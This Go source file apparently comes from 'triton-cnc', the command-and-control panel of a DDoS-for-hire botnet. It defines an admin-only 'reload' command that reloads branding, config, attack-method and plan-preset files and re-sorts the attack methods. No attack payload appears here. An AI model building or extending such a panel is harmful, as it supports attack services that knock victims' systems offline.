package util_Command

import (
	"strconv"
	"triton-cnc/core/sessions/sessions"
	"triton-cnc/core/models/versions"
	"triton-cnc/core/sessions/themes"
	"triton-cnc/core/models/middleware/attack_sort"
	"triton-cnc/core/models/client"
	"triton-cnc/core/models/client/load"
	"triton-cnc/core/models/json/build"
	"triton-cnc/core/models/external"
)


func init() {

	Register(&Command{
		Name: "reload",

		Description: "reload all assets and ofsets",

		Admin: true,
		Reseller: false,
		Vip: false,

		Execute: func(Session *sessions.Session_Store, cmd []string) error {
			for Key, _ := range client.ClientMap {
				delete(client.ClientMap, Key)
			}

			themes.Walk()

			_, error := load.Load()
			if error != nil {
				Session.Channel.Write([]byte("\x1b[38;5;15m[ \x1b[38;5;1mFATAL \x1b[38;5;15m] failed to complete reload of all branding correctly -> "+error.Error()+"\r\n"))
			} else {
				Session.Channel.Write([]byte("\x1b[38;5;15m[ \x1b[38;5;2mDONE \x1b[38;5;15m] correctly reloaded "+strconv.Itoa(len(client.ClientMap))+" items of branding!\r\n"))
			}

			error = build.NewParse_config_json()
			if error != nil {
				Session.Channel.Write([]byte("\x1b[38;5;15m[ \x1b[38;5;1mFATAL \x1b[38;5;15m] failed to load/parse `"+versions.GOOS_Edition.Make["ConfigFile"]+"`\r\n"))
			} else {
				Session.Channel.Write([]byte("\x1b[38;5;15m[ \x1b[38;5;2mDONE \x1b[38;5;15m] correctly loaded/parsed `"+versions.GOOS_Edition.Make["ConfigFile"]+"`\r\n"))
			}

			error = build.NewParse_Attack_Json()
			if error != nil {
				Session.Channel.Write([]byte("\x1b[38;5;15m[ \x1b[38;5;1mFATAL \x1b[38;5;15m] failed to load/parse `"+versions.GOOS_Edition.Make["API_Attack"]+"`\r\n"))
			} else {
				Session.Channel.Write([]byte("\x1b[38;5;15m[ \x1b[38;5;2mDONE \x1b[38;5;15m] correctly loaded/parsed `"+versions.GOOS_Edition.Make["API_Attack"]+"`\r\n"))
			}

			error = build.NewParse_Preset_json()
			if error != nil {
				Session.Channel.Write([]byte("\x1b[38;5;15m[ \x1b[38;5;1mFATAL \x1b[38;5;15m] failed to load/parse `"+versions.GOOS_Edition.Make["PlanPresets"]+"`\r\n"))
			} else {
				Session.Channel.Write([]byte("\x1b[38;5;15m[ \x1b[38;5;2mDONE \x1b[38;5;15m] correctly loaded/parsed `"+versions.GOOS_Edition.Make["PlanPresets"]+"`\r\n"))
			}

			error = build.NewParse_Themes_json()
			if error != nil {
				Session.Channel.Write([]byte("\x1b[38;5;15m[ \x1b[38;5;1mFATAL \x1b[38;5;15m] failed to load/parse `"+versions.GOOS_Edition.Make["Themes"]+"`\r\n"))
			} else {
				Session.Channel.Write([]byte("\x1b[38;5;15m[ \x1b[38;5;2mDONE \x1b[38;5;15m] correctly loaded/parsed `"+versions.GOOS_Edition.Make["Themes"]+"`\r\n"))
			}


			attacksort.SortMets()

			if len(attacksort.Methods_Map) >= 1 {
				Session.Channel.Write([]byte("\x1b[38;5;15m[ \x1b[38;5;2mDONE \x1b[38;5;15m] Correctly sorted `"+strconv.Itoa(len(attacksort.Methods_Map))+"` methods\r\n"))
			} else {
				Session.Channel.Write([]byte("\x1b[38;5;15m[ \x1b[38;5;1mFATAL \x1b[38;5;15m] failed to sort any attack methods\r\n"))
			}

			external.GatherExCommands()
			return nil
		},
	})
}